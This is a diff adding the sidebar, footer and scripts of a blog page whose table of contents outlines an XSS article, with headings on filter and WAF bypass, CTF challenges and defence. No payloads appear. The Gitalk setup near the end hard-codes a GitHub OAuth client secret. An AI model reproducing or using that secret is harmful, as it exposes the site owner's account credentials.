+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么是XSS漏洞"><span class="nav-number">1.</span> <span class="nav-text">什么是XSS漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS分类"><span class="nav-number">1.1.</span> <span class="nav-text">XSS分类</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss-bypass"><span class="nav-number">1.2.</span> <span class="nav-text">xss bypass</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#检测过滤情况"><span class="nav-number">1.2.1.</span> <span class="nav-text">检测过滤情况</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#观察输出位置"><span class="nav-number">1.2.2.</span> <span class="nav-text">观察输出位置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#标签之间"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">标签之间</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#js标签之间"><span class="nav-number">1.2.2.2.</span> <span class="nav-text">js标签之间</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#不在字符串内"><span class="nav-number">1.2.2.2.1.</span> <span class="nav-text">不在字符串内</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#在字符串中"><span class="nav-number">1.2.2.2.2.</span> <span class="nav-text">在字符串中</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#输出在HTML属性内"><span class="nav-number">1.2.2.3.</span> <span class="nav-text">输出在HTML属性内</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#文本属性中"><span class="nav-number">1.2.2.3.1.</span> <span class="nav-text">文本属性中</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#src-href-action-xlink-href-autofocus-content-data-等属性"><span class="nav-number">1.2.2.3.2.</span> <span class="nav-text">src/href/action/xlink:href/autofocus/content/data 等属性</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#on-事件中"><span class="nav-number">1.2.2.3.3.</span> <span class="nav-text">on*事件中</span></a></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#绕过waf"><span class="nav-number">1.2.3.</span> <span class="nav-text">绕过waf</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CTF赛题"><span class="nav-number">2.</span> <span class="nav-text">CTF赛题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#xssme"><span class="nav-number">2.1.</span> <span class="nav-text">xssme</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xssrf-leak"><span class="nav-number">2.2.</span> <span class="nav-text">xssrf leak</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xssrf-redis"><span class="nav-number">2.3.</span> <span class="nav-text">xssrf redis</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#B站waf"><span class="nav-number">3.</span> <span class="nav-text">B站waf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实战"><span class="nav-number">4.</span> <span class="nav-text">实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#pdf-xss"><span class="nav-number">4.1.</span> <span class="nav-text">pdf xss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#上传文件处XSS"><span class="nav-number">4.2.</span> <span class="nav-text">上传文件处XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#excel模版xss"><span class="nav-number">4.3.</span> <span class="nav-text">excel模版xss</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#防御"><span class="nav-number">5.</span> <span class="nav-text">防御</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#补充CSP"><span class="nav-number">6.</span> <span class="nav-text">补充CSP</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
